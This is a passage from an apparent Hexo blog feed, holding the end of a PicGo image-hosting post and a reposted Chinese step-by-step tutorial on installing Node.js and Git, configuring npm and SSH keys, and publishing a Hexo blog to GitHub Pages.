<code>Token</code></p></li><li><p>指定存储路径：填写想要储存的路径，如  <code>img/</code>，这样就会在仓库下创建一个名为  <code>img</code>  的文件夹，图片将会储存在此文件夹中</p></li><li><p>设定自定义域名：它的的作用是，在图片上传后，PicGo 会按照<code>自定义域名+上传的图片名</code>的方式生成访问链接，放到粘贴板上，因为我们要使用  <code>jsDelivr</code>  加速访问，所以可以设置为<code>https://cdn.jsdelivr.net/gh/用户名/图床仓库名</code></p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/9.png" alt=""></p><p><strong>配置 PicGo</strong></p><pre class=" language-text"><code class="language-text">Q：什么是 jsdelivr ?A：jsDelivr 为开发者提供免费公共 CDN 加速服务</code></pre><h3 id="上传图片到-PicGo-并使用图床"><a href="#上传图片到-PicGo-并使用图床" class="headerlink" title="上传图片到 PicGo 并使用图床"></a>上传图片到 PicGo 并使用图床</h3><p>配置好  <code>PicGo</code>  后，我们就可以进行高效创作了，将<code>压缩后的图片</code>拖拽到<code>上传区</code>，将会自动上传并复制<code>访问链接</code>，将链接粘贴到博文中就行了，访问速度杠杠的</p><p>此外 <code>PicGo</code> 还有相册功能，可以对已上传的图片进行删除，修改链接等快捷操作，<code>PicGo</code> 还可以生成不同格式的链接、支持批量上传、快捷键上传、自定义链接格式、上传前重命名等，更多功能自己去探索吧！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-github搭建博客-超级详细版-精细入微</title>
      <link href="/posts/18413.html"/>
      <url>/posts/18413.html</url>
      
        <content type="html"><![CDATA[<h5 id="声明："><a href="#声明：" class="headerlink" title="声明："></a>声明：</h5><blockquote><p>本文为转载文章，由 前端技术江湖整理</p><p>原文链接：yafine-blog.cn/posts/4ab2.html</p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>你了解<a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener" title="Hexo官网">Hexo</a>吗？ Hexo是一个静态博客框架，基于Node.js，将Markdown文章通过渲染引擎，生成一个静态网页，再结合Git命令（ssh），Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 <a href="http://daringfireball.net/projects/markdown/" target="_blank" rel="noopener">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><p>几个月前偶然间了解到了Hexo这个静态博客网站，很适合那些喜欢写作的朋友们，最重要的是它是免费的，里面有许多的博客主题模板，这些主题都是一些很牛的大佬们开发的，而且设计的主题都很棒，让我很心动，心动不如行动，于是开始整理搭建属于自己的博客。直到今天，这中间经历了许多的坎坷荆棘​，我将我的博客搭建的流程分享出来，能为那些博客小石榴们提供一些帮助吧，如果有错的话，请给我留言，我会及时修改，废话不多说，直接上教程。</p><blockquote><p><strong>如果下面的教程有错误之处，请在评论区留言，收到后，我会尽快修改，谢谢支持！</strong></p></blockquote><h1 id="一、博客环境搭建"><a href="#一、博客环境搭建" class="headerlink" title="一、博客环境搭建"></a>一、博客环境搭建</h1><blockquote><p>本文系统环境信息：Win10专业版，64位（10.0 版本18362）</p><p>Node.js：12.13.0 Git：2.24.0</p><p>修改配置文件要用到的软件（可选）：</p><ol><li><a href="https://code.visualstudio.com/" target="_blank" rel="noopener" title="Vscode官网">Visual Studio Code</a>（适合有开发基础的程序员，非常好用）</li><li>Sublime Text3，可免费使用，<a href="https://pan.baidu.com/s/1uKA-aBHm_CsmJI5GolrV1Q" target="_blank" rel="noopener">百度网盘</a>（提取码：mh0y）</li><li><a href="https://notepad-plus-plus.org/downloads/" target="_blank" rel="noopener">NodePad++</a> 7.8.1（最新的，也可以在官网选择其他版本）</li></ol></blockquote><h2 id="1-下载Git和Node-js"><a href="#1-下载Git和Node-js" class="headerlink" title="1. 下载Git和Node.js"></a>1. 下载Git和Node.js</h2><h3 id="1-1-Node-js的安装与配置"><a href="#1-1-Node-js的安装与配置" class="headerlink" title="1.1 Node.js的安装与配置"></a>1.1 Node.js的安装与配置</h3><p>首先去<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener" title="Node.js下载">Node.js官网</a> 下载node.js的安装程序，根据你电脑系统的配置信息，下载对应的安装程序，然后开始进行下面的步骤。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/nodejs-0.pn" alt="Node.js下载以及版本的选择">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/nodejs-0.png" alt="Nodejs下载以及版本的选择"></p><p>下载好与电脑系统对应的安装程序后，开始安装流程：</p><ol start="2"><li>打开下载好的Node.js安装程序，点击Next，进行下一步的安装；</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/node-1.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/node-1.png" alt=""></p><ol start="3"><li>将”I accept the terms in the License Agreement”前面的复选框勾选，同意安装协议，再点击Next，进行下一步操作；</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/node-2.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/node-2.png" alt=""></p><ol start="4"><li>选择Node.js安装程序的安装位置，在这里我以”C:\Program Files\nodejs”为例，点击Next，进入下一步操作；</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/node-3.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/node-3.png" alt=""></p><ol start="5"><li>选择安装的模块和功能，这里全部安装，并添加到系统环境变量 ，继续点击Next，进入下一步操作；</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/node-4.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/node-4.png" alt=""></p><ol start="6"><li>这一步可以跳过，这个选项的意思是安装一些编译本地模块的工具，比如python，C/C++等，点击Next，进入下一步；</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/node-5.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/node-5.png" alt=""></p><ol start="7"><li>点击”Install”，等待Node.js安装完成；</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/node-6.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/node-6.png" alt=""></p><ol start="8"><li>当看到下图所显示的情况，Node.js就成功安装完毕。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/node-7.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/node-7.png" alt=""></p><ol start="9"><li>验证安装，并测试Node.js是否加入环境变量，当出现如下图的情况，Node.js安装大功告成。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/node-8.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/node-8.png" alt=""></p><p>如果执行<code>node -v</code>报错的话，那么手动将Node.js的安装路径添加到环境变量中，右击点击我的电脑 -&gt;属性 -&gt; 高级系统设置 -&gt; 环境变量，在系统变量下找到名为path的变量名，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117191107.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117191107.png" alt=""></p><p>选中path，或者双击，然后将你node.js的安装路径放在path变量值的最后面，如果添加之前path值最后有 英文的分号，则直接将路径添加进去即可，如果没有，先添加分号，然后点击保存，回到桌面，打开cmd（Win+R），执行<code>node -v</code>，看是否成功。</p><ol start="10"><li>设置npm的镜像源：</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 查看npm的配置</span><span class="token function">npm</span> config list<span class="token comment" spellcheck="true"># 默认源</span><span class="token function">npm</span> config <span class="token keyword">set</span> registry https://registry.npmjs.org<span class="token comment" spellcheck="true"># 临时改变镜像源</span><span class="token function">npm</span> --registry<span class="token operator">=</span>https://registry.npm.taobao.org<span class="token comment" spellcheck="true"># 永久设置为淘宝镜像源</span><span class="token function">npm</span> config <span class="token keyword">set</span> registry https://registry.npm.taobao.org<span class="token comment" spellcheck="true"># 另一种方式，编辑 ~/.npmrc 加入下面内容</span>registry <span class="token operator">=</span> https://registry.npm.taobao.org</code></pre><ol start="11"><li>设置npm的内置路径——&gt;全局模块路径和缓存路径（<em>可选</em>）</li></ol><p>如果不改变内置路径也可，除非你的C盘空间足够bigger，这一步可以略过，不改变的话，它的路径在：</p><blockquote><p>此处参考：<a href="https://blog.csdn.net/jianleking/article/details/79130667" target="_blank" rel="noopener">jyjin的node环境变量配置，npm环境变量配置</a></p></blockquote><ul><li>npm包全局目录：<code>C:/Users/[username]/AppData/Roaming/npm/node_modules</code></li><li>npm包全局命令目录：<code>C:/Users/[username]/AppData/Roaming/npm</code></li><li>npm实际去找全局命令的目录：<code>C:/Users/[username]/.npmrc</code> 文件内容的<code>prefix</code>值</li><li>npm包全局cache目录：<code>C:/Users/[username]/.npmrc</code> 文件内容的<code>cache</code>值</li></ul><p>首先在你Node.js的安装位置，新建两个文件夹，<code>node_global</code>和<code>node_cache</code>，我的路径是：</p><pre><code>C:\Program Files\nodejs\node_globalC:\Program Files\nodejs\node_cache</code></pre><p>然后分别执行的命令就是：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token keyword">set</span> prefix<span class="token string">"C:\Program Files\nodejs\node_global"</span><span class="token function">npm</span> config <span class="token keyword">set</span> cache <span class="token string">"C:\Program Files\nodejs\node_cache"</span></code></pre><p>然后在配置环境变量，右击我的电脑 -&gt;属性 -&gt; 高级系统设置 -&gt; 环境变量同样的位置，在用户变量的地方，找到path变量进行修改，修改值如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/node-11.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/node-11.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/node-12.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/node-12.png" alt=""></p><p>然后就大功告成了，Node.js就安装完毕了，下面开始Git安装。:point_down::point_down::point_down:</p><h3 id="1-2-Git的安装与配置"><a href="#1-2-Git的安装与配置" class="headerlink" title="1.2 Git的安装与配置"></a>1.2 Git的安装与配置</h3><p>首先就是去<a href="https://git-scm.com/" target="_blank" rel="noopener" title="Git官网">Git官网</a>下载Git，根据你电脑系统的配置信息，下载对应的安装程序，然后开始进行下面的步骤。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117193737.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117193737.png" alt=""></p><ol start="2"><li>下载好Git的安装包，开始安装，打开安装包，出现如图的界面，点击Next：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-1.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-1.png" alt=""></p><ol start="3"><li>选择你要安装的位置，我以C盘为例，路径为图中所示，安装到其他位置的话，点击Browse，选择你要安装的位置，然后点击Next，进入下一步：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-2.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-2.png" alt=""></p><ol start="4"><li>选择你是否创建桌面快捷放方式，其他默认即可，点击Next，进入下一步：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-3.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-3.png" alt=""></p><ol start="5"><li>是否将Git快捷方式的目录加入开是菜单栏</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-4.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-4.png" alt=""></p><ol start="6"><li>这个是选择文本编辑器的方式，默认是Vim，也可以选择其他的方式，自主选择，在这里我选择的Vim默认方式。选择好文本编辑器的方式后，点击Next，进入下一个流程：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-5.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-5.png" alt=""></p><ol start="7"><li>选择安装 Git 时对环境变量PATH的影响，第一种影响较小，第三种会影响到Windows的自带工具，默认勾选中间项，建议不要修改，直接点击 “Next” 继续安装：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-6.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-6.png" alt=""></p><ol start="8"><li>选择 Git 在使用 HTTPS 时使用的库，若无特殊需求，可保持默认选项，点击 “Next” 继续安装：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-7.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-7.png" alt=""></p><ol start="9"><li>选择提交与拉取记录时，对换行符的处理方式，若无特殊需要，默认选择即可，点击 “Next” 继续安装：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-8.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-8.png" alt=""></p><ol start="10"><li>选择模拟终端软件（即命令行窗口软件），若无特殊需要，可默认选择，点击 “Next” 继续安装：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-9.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-9.png" alt=""></p><ol start="11"><li>最新功能的询问，若不想尝试尚未保证稳定性的新功能，默认不勾选，点击 “Install” 即可完成安装：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-10.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-10.png" alt=""></p><ol start="12"><li>安装完成</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-11.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-11.png" alt=""></p><ol start="13"><li>回到桌面，点击鼠标右键，会出现两个选项<code>Git GUI Here</code>和<code>Git Bash Here</code>，在打开Cmd(Win+R)，分别输入<code>git</code>和<code>git --version</code>，如果出现如下图的情况，即安装成功！</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-12.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-12.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-13.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/git-13.png" alt=""></p><h1 id="二、Github注册以及Github-Pages创建"><a href="#二、Github注册以及Github-Pages创建" class="headerlink" title="二、Github注册以及Github Pages创建"></a>二、Github注册以及Github Pages创建</h1><ol start="2"><li>打开Github<a href="https://github.com/" target="_blank" rel="noopener" title="GitHub官网">官网首页</a>，点击右上角的<strong>Sign Up</strong> ，然后在出现的页面上填写你的相关信息，进行注册：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117203432.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117203432.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117204639.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117204639.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117204955.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117204955.png" alt=""></p><p>验证完成后，点击Next：Select a plan，会出现如上图的验证界面，同理，只需要将其中的动物调整为正向显示即可。接着会出现下图的界面，选择Free，下方的两个选项可选可不选，点击<strong>Continue</strong>继续：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117211431.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117211431.png" alt=""></p><p>这时Github会给你发一封邮件，验证一下即可，验证过后才可以创建库。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117212721.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117212721.png" alt=""></p><p>验证完成后，开始创建库，如下图所示，仓库名创建格式必须为：<code>&lt;用户名&gt;.github.io</code>，<code>Description</code>为描述仓库，自定义写，填写必要的描述，也可不填。勾选<code>Initialize this repository with a README</code>点击<code>Creat repository</code>进行创建。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117212538.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117212538.png" alt=""></p><p>然后就会出现如图所示的界面，即仓库创建成功！</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117213321.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117213321.png" alt=""></p><p>我们来测试一下，点击<code>Create new file</code>，出现如下界面，然后命名文件名为<code>index.html</code>，在填写如图的内容，再点击<code>Commit new file</code>，即创建成功，然后打开一个新的网页，输入网址<code>https://&lt;你的用户名&gt;.github.io</code>，即可以看见一个新的网页，其中的内容就是你写的内容。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117214029.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117214029.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117213957.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117213957.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117214450.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117214450.png" alt=""></p><p>至此，Github的注册以及Github Pages已经创建完成了。</p><h1 id="三、配置Git用户名和邮箱"><a href="#三、配置Git用户名和邮箱" class="headerlink" title="三、配置Git用户名和邮箱"></a>三、配置Git用户名和邮箱</h1><p>在桌面点击鼠标右键，点击<code>Git Bash Here</code>，会出现一个界面如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117215118.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117215118.png" alt=""></p><p>然后分别输入下面的两个命令，并回车：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> config --global user.name <span class="token string">"此处填写你注册时的用户名"</span><span class="token function">git</span> config --global user.email <span class="token string">"此处填写你注册时的邮箱"</span><span class="token comment" spellcheck="true"># 一般只要不报错，可以跳过下面寻找.gitconfig文件</span></code></pre><p>然后找到<code>.gitconfig</code>文件，文件存放位置在<code>C:/Users/[username]/.gitconfig</code>（未找到的话，请开启显示隐藏文件的功能），用编辑器打开，看到如下图所示的内容，即配置成功！</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117220016.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117220016.png" alt=""></p><h1 id="四、本地安装hexo静态博客框架以及发布到Github-Pages"><a href="#四、本地安装hexo静态博客框架以及发布到Github-Pages" class="headerlink" title="四、本地安装hexo静态博客框架以及发布到Github Pages"></a>四、本地安装hexo静态博客框架以及发布到Github Pages</h1><ol start="2"><li>首先选择一个磁盘作为你博客文件的存放位置，然后新建一个文件夹，比如名为blogtest的文件夹，创建完后，先不要点进去，在此处点击鼠标右键，选择<code>Git Bash Here</code>，然后依次输入如下命令，：</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># hexo框架的安装</span><span class="token function">npm</span> <span class="token function">install</span> -g hexo-cli<span class="token comment" spellcheck="true"># 等上一个命令完成后，在输入下面的命令</span>hexo init <span class="token operator">&lt;</span>新建文件夹的名称<span class="token operator">></span>  <span class="token comment" spellcheck="true">#初始化文件夹</span><span class="token function">cd</span> <span class="token operator">&lt;</span>新建文件夹的名称<span class="token operator">></span><span class="token function">npm</span> <span class="token function">install</span>  <span class="token comment" spellcheck="true"># 安装博客所需要的依赖文件</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117221129.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117221144.png" alt=""></p><p>等待运行完成，此时文件夹中多了许多文件。 <strong>注意</strong>：<strong>后续的命令均需要在站点目录下（即文件夹内）使用Git Bash运行。</strong> 此时Hexo框架的本地搭建已经完成了。我们来运行一下看看，命令行依次输入以下命令 :</p><pre class=" language-bash"><code class="language-bash">hexo ghexo s</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117221157.png" alt=""></p><p>浏览器中打开</p><p><a href="http://lacakhost:4000" target="_blank" rel="noopener">http://lacakhost:4000</a></p><p>能看到网页说明hexo在本地运行成功。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191117221206.png" alt=""></p><h2 id="1-本地博客发布到Github-Pages"><a href="#1-本地博客发布到Github-Pages" class="headerlink" title="1. 本地博客发布到Github Pages"></a>1. 本地博客发布到Github Pages</h2><p>之前的步骤中，我们已经完成了对Github账户的注册以及Github Pages的创建，接下来是将本地博客发布至Github Pages。</p><ol start="2"><li>首先需要安装发布的插件，在站点目录下执行下面的命令，也就是创建的博客目录下：</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git --save</code></pre><ol start="3"><li>紧接着，将本地目录与GitHub关联起来，输入下面的命令行：</li></ol><pre class=" language-bash"><code class="language-bash">ssh-keygen -t rsa -C <span class="token string">"你的邮箱地址"</span></code></pre><p>输入后一直回车，然后在<code>C:/Users/[username]</code>目录下找到名为<code>.ssh</code>的文件夹， 文件夹内会有两个文件，一个<code>id_rsa.pub</code>一个<code>id_rsa</code>，用文本编辑器打开<code>id_rsa.pub</code>，复制里面的的内容。 然后打开Github，点击右上角的头像 <strong>Settings</strong> 选择<strong>SSH and GPG keys</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" 